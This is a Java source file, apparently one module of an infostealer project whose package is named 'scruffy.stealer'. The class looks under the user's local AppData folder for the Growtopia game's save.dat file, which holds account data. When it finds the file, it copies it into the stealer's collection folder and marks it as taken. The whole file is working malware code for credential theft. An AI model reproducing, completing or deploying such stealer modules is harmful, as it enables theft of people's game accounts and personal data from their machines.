package scruffy.stealer.impl.game;

import java.io.File;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;

public class growtopia extends utilities {

	public void initialize() throws Exception {
		File path = new File(System.getenv("localappdata") + "/Growtopia/save.dat");
		if (path.exists()) {
			FileUtils.copyFile(path, new File(getFolder() + "/game/growtopia/" + path.getName()));
			content.add("growtopia");
		}
	}

}